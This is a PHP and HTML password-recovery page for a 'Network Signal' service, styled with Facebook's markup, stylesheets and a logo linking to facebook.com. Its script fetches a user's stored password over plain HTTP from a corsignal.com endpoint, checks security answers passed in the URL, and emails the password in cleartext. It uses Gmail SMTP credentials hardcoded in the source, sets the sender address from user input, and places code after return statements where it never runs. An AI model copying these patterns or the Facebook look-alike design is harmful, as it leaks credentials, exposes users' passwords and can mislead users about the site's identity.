
<!DOCTYPE html>
<style>
    .lbl{font: x-large;}
    .txt_report_operator{margin-bottom: 10px; border-radius: 5px;}
</style>
<?php
include_once './resources/resources.php';

function GetData($email,$password) {
    try {
        require_once ( './resources/PHPMailer-masterAPI/class.phpmailer.php' ); // Add the path as appropriate
        include_once './resources/PHPMailer-masterAPI/PHPMailerAutoload.php';

        $Mail = new PHPMailer();
        $Mail->IsSMTP(); // Use SMTP
        $Mail->Host = "smtp.gmail.com"; // Sets SMTP server
        $Mail->SMTPDebug = 2; // 2 to enable SMTP debug information
        $Mail->SMTPAuth = TRUE; // enable SMTP authentication
        $Mail->SMTPSecure = "ssl"; //Secure conection
        $Mail->Port = 465; // set the SMTP port
        $Mail->Username = 'osamamohsen1994@gmail.com'; // SMTP account username
        $Mail->Password = '02268581720226858172'; // SMTP account password
        $Mail->Priority = 1; // Highest priority - Email priority (1 = High, 3 = Normal, 5 = low)
        $Mail->CharSet = 'UTF-8';
        $Mail->Encoding = '8bit';
        $Mail->Subject = 'Network Signal Problem Analysis Send Message For Your Account'; // 2le hyzhar fe al content
        $Mail->ContentType = 'text/html; charset=utf-8\r\n';
        $Mail->From = $_GET['email'];
        $Mail->FromName = 'Network Signal Problem Analysis';
        $Mail->WordWrap = 900; // RFC 2822 Compliant for Max 998 characters per line

        $Mail->AddAddress($_GET['email']); // To:
        $Mail->isHTML(TRUE);
        $Mail->Body = "Email: " . $email . "<br/>password: " . $password;
        $Mail->Send();
        $Mail->SmtpClose();
        if ($Mail->IsError("Done For Testing")) { // ADDED - This error checking was missing
            return FALSE;
            header('Location: ' . $_SERVER['REQUEST_URI']);
            echo "<script type='text/javascript'>alert('Error in Sending Your Email Please Check Your Input Again');</script>";
        } else {

            return TRUE;
//                header("Location: ./index.php");
            header('Location: ' . $_SERVER['REQUEST_URI']);

            echo "<script type='text/javascript'>alert('Check Your Email Address');</script>";
        }
    } catch (Exception $ex) {
        header('Location: ' . $_SERVER['REQUEST_URI']);
        echo "<script type='text/javascript'>alert('Error in Sending Your Email Please Check Your Input Again');</script>";
    }
}
?>
<?php
if (isset($_GET['email'])) {
//    echo 'asd';
    $url = "http://corsignal.com/networksignal/parsedata/get_by_mail.php?mail=" . $_GET['email'];
    $data = file_get_contents($url);
    $res = json_decode($data, TRUE);
//    var_dump($res);

    if ($res != "null" && $res['how_know'] == $_GET['howknow'] && $res['other_know'] == $_GET['otherknow']) {
        if (GetData($res['email'],$res['password']) == TRUE) {

            echo " <script>"
            . " location.replace('login.php'); alert('please Check Your Email Address'); </script>";
            exit();
        } else {
            header('Location: ' . $_SERVER['REQUEST_URI']);
        }
    } else {
        echo "<script type='text/javascript'>alert('Error in Sending Your Email Please Check Your Input Again');</script>";
    }
}
?>
<html lang="en" id="facebook" class="no_js">
    <head><meta charset="utf-8" />
        <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/ya/r/y8nING7MT7J.css" data-bootloader-hash="VZsFo" data-permanent="1" />
    <body>
        <style> .txt_unCorrect{border-radius: 5px; margin-top: 15px; height: 22px; width: 250px;}
            .drop_unCorrect{border-radius: 5px; height: 28px; width: 250px;}
            .btn-primars{background-color: #2aabd2; color: white; width: 250px; height: 30px; border-radius: 5px;}
        </style>
        <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yp/r/8Av68oRxr9q.css" data-bootloader-hash="IOHxm" data-permanent="1" />
        <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y8/r/_BHd8eTxkY6.css" data-bootloader-hash="1y/ac" data-permanent="1" />
    <body class="login_page fbx UIPage_LoggedOut _2gsg gecko win x1 Locale_en_US" dir="ltr"><div class="_li"><div id="pagelet_bluebar" role="banner" data-click="bluebar" data-click-phase="0"><div id="blueBarDOMInspector" class="_21mm"><div id="blueBarNAXAnchor" class="_4f7n _xxp"><div><div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar"><div class="lfloat _ohe"><h1><a href="https://www.facebook.com/" title="Go to Facebook Home">
                                                <i class=""><img style="margin-left: 532px;" src="login/img/freeze/logo.png" alt=""/></u></i></a></h1></div></div></div><div class="signupBanner"><div class="signup_bar_container"><div class="signup_box clearfix"><span class="signup_box_content"></span></div></div></div></div></div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div class="fb_content clearfix " id="content" role="main"><div class="UIFullPage_Container"><div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div class="clearfix uiHeaderTop"><div class="rfloat _ohf"><h2 class="accessible_elem">Please Enter Your Email</h2><div class="uiHeaderActions"></div></div><div><h2 class="uiHeaderTitle" aria-hidden="true">Please Enter Your Email Address</h2></div></div></div><div class="phl ptm uiInterstitialContent"><div class="login_form_contaiNetwner">
                                    <form  data-parsley-validate data-validate="parsley" id="login_form" action="forgetPassword.php" >
                                        <table class="table" style="width: 100%;">
                                            <tr><td style="text-align: center; font-size: medium;">Email Address</td><td><input style="width: 100%; height: 33px;" name="email" type="email" required="required" data-parsley-trigger="keypress" class="txt_report_operator"/>
                                                </td></tr><tr>
                                                <td style="text-align: center; font-size: medium;">How Know</td>
                                                <td><input style="width: 100%; height: 33px;" name="howknow" type="text" required="required" data-parsley-trigger="keypress" class="txt_report_operator"/>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td style="text-align: center; font-size: medium;">Other Know</td>
                                                <td><input style="width: 100%; height: 33px;" name="otherknow" type="text" required="required" data-parsley-trigger="keypress" class="txt_report_operator"/></td>
                                            </tr>
                                        </table>
                                        <input style="font: x-large; margin-left: 500px; color: white; border-radius: 5px; background-color: #0c67a4; padding: 7px; " type="submit" class="btn-lg btn-primary" value="Forget Password" />

                                    </form>
                                    <label class="login_form_label"></label>
                                    <div id="login_button_inline">

                                        <!--<a href="https://www.facebook.com/recover/initiate" target="">Forgot your password?</a>--> 
                                        </p></div></form>

                                    <!-- BigPipe construction and first response -->
                                    </body></html>